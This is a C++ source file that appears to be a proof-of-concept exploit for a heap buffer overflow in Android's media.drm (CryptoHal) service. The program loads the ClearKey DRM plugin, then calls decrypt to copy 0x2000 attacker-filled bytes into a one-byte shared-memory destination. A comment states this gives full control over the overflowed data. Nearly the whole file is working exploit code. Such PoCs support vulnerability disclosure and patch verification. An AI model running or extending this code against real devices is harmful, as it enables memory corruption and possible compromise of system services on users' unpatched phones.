#include <utils/StrongPointer.h>
#include <binder/IServiceManager.h>
#include <binder/MemoryHeapBase.h>
#include <binder/MemoryBase.h>
#include <binder/IMemory.h>
#include <media/ICrypto.h>
#include <media/IMediaDrmService.h>
#include <media/hardware/CryptoAPI.h>

#include <stdio.h>
#include <unistd.h>

using namespace android;

static sp<ICrypto> getCrypto()
{
    sp<IServiceManager> sm = defaultServiceManager();
    sp<IBinder> binder = sm->getService(String16("media.drm"));
    sp<IMediaDrmService> service = interface_cast<IMediaDrmService>(binder);
    if (service == NULL) {
        fprintf(stderr, "Failed to retrieve 'media.drm' service.\n");
        return NULL;
    }
    sp<ICrypto> crypto = service->makeCrypto();
    if (crypto == NULL) {
        fprintf(stderr, "makeCrypto failed.\n");
        return NULL;
    }
    return crypto;
}

static bool setClearKey(sp<ICrypto> crypto)
{
    // A UUID which identifies the ClearKey DRM scheme.
    const uint8_t clearkey_uuid[16] = {
        0x10, 0x77, 0xEF, 0xEC, 0xC0, 0xB2, 0x4D, 0x02,
        0xAC, 0xE3, 0x3C, 0x1E, 0x52, 0xE2, 0xFB, 0x4B
    };
    if (crypto->createPlugin(clearkey_uuid, NULL, 0) != OK) {
        fprintf(stderr, "createPlugin failed.\n");
        return false;
    }
    return true;
}

#define DATA_SIZE (0x2000)
#define DEST_OFFSET (1)

static void executeOverflow()
{
    // Get an interface to a remote CryptoHal object.
    sp<ICrypto> crypto = getCrypto();
    if (crypto == NULL) {
        return;
    }

    if (!setClearKey(crypto)) {
        return;
    }

    // From here we're done with the preparations and go into the
    // vulnerability PoC.

    sp<MemoryHeapBase> heap = new MemoryHeapBase(DATA_SIZE);
    // This line is to merely show that we have full control over the data
    // written in the overflow.
    memset(heap->getBase(), 'A', DATA_SIZE);
    sp<MemoryBase> sourceMemory = new MemoryBase(heap, 0, DATA_SIZE);
    sp<MemoryBase> destMemory = new MemoryBase(heap, DATA_SIZE - DEST_OFFSET,
        DEST_OFFSET);
    int heapSeqNum = crypto->setHeap(heap);
    if (heapSeqNum < 0) {
        fprintf(stderr, "setHeap failed.\n");
        return;
    }

    CryptoPlugin::Pattern pattern = { .mEncryptBlocks = 0, .mSkipBlocks = 1 };
    ICrypto::SourceBuffer source = { .mSharedMemory = sourceMemory,
        .mHeapSeqNum = heapSeqNum };
    // mNumBytesOfClearData is the actual size of data to be copied.
    CryptoPlugin::SubSample subSamples[] = { {
        .mNumBytesOfClearData = DATA_SIZE, .mNumBytesOfEncryptedData = 0 } };
    ICrypto::DestinationBuffer destination = {
        .mType = ICrypto::kDestinationTypeSharedMemory, .mHandle = NULL,
        .mSharedMemory = destMemory };

    printf("decrypt result = %zd\n", crypto->decrypt(NULL, NULL,
        CryptoPlugin::kMode_Unencrypted, pattern, source, 0, subSamples,
        ARRAY_SIZE(subSamples), destination, NULL));
}

int main() {
    executeOverflow();
    return 0;
}